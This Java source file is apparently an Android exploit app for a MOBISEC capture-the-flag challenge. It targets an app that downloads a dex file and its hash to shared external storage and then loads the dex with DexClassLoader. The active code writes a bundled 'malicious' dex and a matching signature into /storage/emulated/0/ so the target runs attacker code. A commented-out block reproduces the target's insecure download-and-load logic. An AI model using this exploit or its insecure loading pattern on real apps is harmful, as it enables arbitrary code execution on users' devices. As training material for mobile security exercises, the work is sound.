package com.example.fortnite;

import androidx.appcompat.app.AppCompatActivity;

import android.content.res.AssetManager;
import android.os.Bundle;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Timer;
import java.util.TimerTask;


public class MainActivity extends AppCompatActivity {

    private static String codeFilePath = null;
    private static String hashFilePath = null;

    private void setFlag(Intent intent) {
        String flag2;
        Log.e("MOBISEC", "Intent received..." + intent.getExtras().isEmpty());
        if (intent != null && (flag2 = intent.getStringExtra("flag")) != null) {
            Log.e("MOBISEC", flag2);
            Log.e("MOBISEC", "flag set correctly");
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        /*
        byte[] bytes = new byte[0];
        try {
            InputStream input = this.getAssets().open("classes3.dex");
            BufferedInputStream bufferedInputStream = new BufferedInputStream(input);
            byte[] auxbuffer = new byte[1024];
            int totalBytesRead = 0;
            int bytesRead;
            while ((bytesRead = bufferedInputStream.read(auxbuffer)) != -1) {
                totalBytesRead += bytesRead;
            }

            Log.i("MOBISEC", "File length: " + totalBytesRead);
            bytes = new byte[totalBytesRead];
            InputStream input2 = this.getAssets().open("classes3.dex");
            BufferedInputStream buf = new BufferedInputStream(input2);
            buf.read(bytes, 0, bytes.length);
            buf.close();

        } catch (IOException e) {
            Log.i("MOBISEC", e.toString());
        }
        String actualHash = bin2hex(getHash(bytes));
        Log.i("MOBISEC", actualHash);
        */
        /*
        setFlag(getIntent());
        Timer timer = new Timer();
        timer.schedule(new TimerTask() { // from class: com.mobisec.fortnite.MainActivity.1
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                Log.e("MOBISEC", "starting downloading fortnite game and signature");
                String unused = MainActivity.codeFilePath = MainActivity.this.downloadFile("http://10.0.2.2:31337/fortnite", "fortnite.dex");
                String unused2 = MainActivity.hashFilePath = MainActivity.this.downloadFile("http://10.0.2.2:31337/sign", "sign.dat");
            }
        }, 1000L);
        timer.scheduleAtFixedRate(new TimerTask() { // from class: com.mobisec.fortnite.MainActivity.2
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                MainActivity.this.verifyAndRunCode(MainActivity.codeFilePath, MainActivity.hashFilePath);
            }
        }, 2000L, 5000L);
         */
        Timer timer = new Timer();
        timer.schedule(new TimerTask() { // from class: com.mobisec.fortnite.MainActivity.1
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                Log.e("MOBISEC", "starting downloading malicious game and signature");
                modDownloadFile();
            }
        }, 1500L);
    }

    public void modDownloadFile() {
        byte[] bytes = new byte[0];
        byte[] bytes2 = new byte[0];
        try {
            InputStream input = this.getAssets().open("classes3.dex");
            BufferedInputStream bufferedInputStream = new BufferedInputStream(input);
            byte[] auxbuffer = new byte[1024];
            int totalBytesRead = 0;
            int bytesRead;
            while ((bytesRead = bufferedInputStream.read(auxbuffer)) != -1) {
                totalBytesRead += bytesRead;
            }

            Log.i("MOBISEC", "File length: " + totalBytesRead);
            bytes = new byte[totalBytesRead];
            InputStream input2 = this.getAssets().open("classes3.dex");
            BufferedInputStream buf = new BufferedInputStream(input2);
            buf.read(bytes, 0, bytes.length);
            buf.close();

            File file1 = new File("/storage/emulated/0/", "fortnite.dex");

            InputStream input3 = this.getAssets().open("sign.dat");
            BufferedInputStream bufferedInputStream2 = new BufferedInputStream(input3);
            byte[] auxbuffer2 = new byte[1024];
            int totalBytesRead2 = 0;
            int bytesRead2;
            while ((bytesRead2 = bufferedInputStream2.read(auxbuffer2)) != -1) {
                totalBytesRead2 += bytesRead2;
            }

            Log.i("MOBISEC", "File length: " + totalBytesRead);
            bytes2 = new byte[totalBytesRead2];
            InputStream input4 = this.getAssets().open("sign.dat");
            BufferedInputStream buf2 = new BufferedInputStream(input4);
            buf2.read(bytes2, 0, bytes2.length);
            buf2.close();
            File file2 = new File("/storage/emulated/0/", "sign.dat");

            FileOutputStream fileOutput1 = new FileOutputStream(file1);
            fileOutput1.write(bytes);
            fileOutput1.flush();
            fileOutput1.close();
            FileOutputStream fileOutput2 = new FileOutputStream(file2);
            fileOutput2.write(bytes2);
            fileOutput2.flush();
            fileOutput2.close();

        } catch (Exception e) {
            Log.e("MOBISEC", "Exception while downloading malicious:" + Log.getStackTraceString(e));
        }
    }
    public String downloadFile(String url, String fileName) {
        try {
            URL downloaded_url = new URL(url);
            HttpURLConnection urlConnection = (HttpURLConnection) downloaded_url.openConnection();
            urlConnection.connect();
            File file = new File(Environment.getExternalStorageDirectory(), fileName);
            if (file.exists()) {
                file.delete();
            }
            FileOutputStream fileOutput = new FileOutputStream(file);
            InputStream inputStream = urlConnection.getInputStream();
            byte[] buffer = new byte[64];
            while (true) {
                int bufferLength = inputStream.read(buffer);
                if (bufferLength > 0) {
                    fileOutput.write(buffer, 0, bufferLength);
                } else {
                    fileOutput.close();
                    Log.e("MOBISEC", "File downloaded from " + url + " to " + file.getAbsolutePath());
                    return file.getAbsolutePath();
                }
            }
        } catch (Exception e) {
            Log.e("MOBISEC", "Exception while downloading:" + Log.getStackTraceString(e));
            return null;
        }
    }

    byte[] readFile(String inputFileName) {
        File file = new File(inputFileName);
        byte[] result = new byte[(int) file.length()];
        int totalBytesRead = 0;
        try {
            InputStream input = new BufferedInputStream(new FileInputStream(file));
            while (totalBytesRead < result.length) {
                int bytesRemaining = result.length - totalBytesRead;
                int bytesRead = input.read(result, totalBytesRead, bytesRemaining);
                if (bytesRead > 0) {
                    totalBytesRead += bytesRead;
                }
            }
            input.close();
        } catch (Exception e) {
            Log.e("MOBISEC", "Exception while reading files:" + Log.getStackTraceString(e));
        }
        return result;
    }

    public static byte[] getHash(byte[] payload) {
        MessageDigest digest = null;
        try {
            digest = MessageDigest.getInstance("SHA-256");
        } catch (NoSuchAlgorithmException e1) {
            e1.printStackTrace();
        }
        digest.reset();
        return digest.digest(payload);
    }

    static String bin2hex(byte[] data) {
        return String.format("%0" + (data.length * 2) + 'x', new BigInteger(1, data));
    }

    public void verifyAndRunCode(String codePath, String hashPath) {
        if (codePath == null || hashPath == null) {
            Log.e("MOBISEC", "error: codepath or hashpath is null");
            return;
        }
        File tmpDir = new File(getFilesDir().getAbsolutePath());
        File codeFile = new File(codePath);
        new File(hashPath);
        try {
            String expectedHash = new String(readFile(hashPath));
            byte[] payload = readFile(codePath);
            String actualHash = bin2hex(getHash(payload));
            if (!expectedHash.equals(actualHash)) {
                Log.e("MOBISEC", "verification error: the hash doesn't match the expected value. Aborting loading procedure.");
                return;
            }
            DexClassLoader classloader = new DexClassLoader(codeFile.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader());
            Class<?> classToLoad = classloader.loadClass("com.mobisec.fortnitepayload.Payload");
            Method method = classToLoad.getDeclaredMethod("run", new Class[0]);
            method.invoke(classToLoad, new Object[0]);
            setFlag(getIntent());
        } catch (Exception e) {
            Log.e("MOBISEC", "Exception while loading/running code:" + Log.getStackTraceString(e));
        }
    }

}